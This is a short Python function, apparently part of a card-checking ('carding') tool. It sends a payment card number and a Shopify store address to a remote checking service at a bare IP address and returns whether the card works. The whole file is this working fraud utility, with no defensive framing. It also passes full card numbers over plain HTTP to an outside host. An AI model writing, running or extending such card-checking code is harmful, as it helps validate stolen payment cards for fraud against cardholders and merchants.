import httpx

async def autoshopify(site, cc, session=None):
    """
    Check card against Shopify site
    Returns dict with response data or None on failure
    """
    url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&sync=false"
    
    try:
        if session:
            response = await session.get(url, timeout=90.0)
        else:
            async with httpx.AsyncClient(timeout=90.0) as client:
                response = await client.get(url)
        
        data = response.json()
        return data
        
    except Exception as e:
        print(f"[autoshopify error] {e}")
        return None
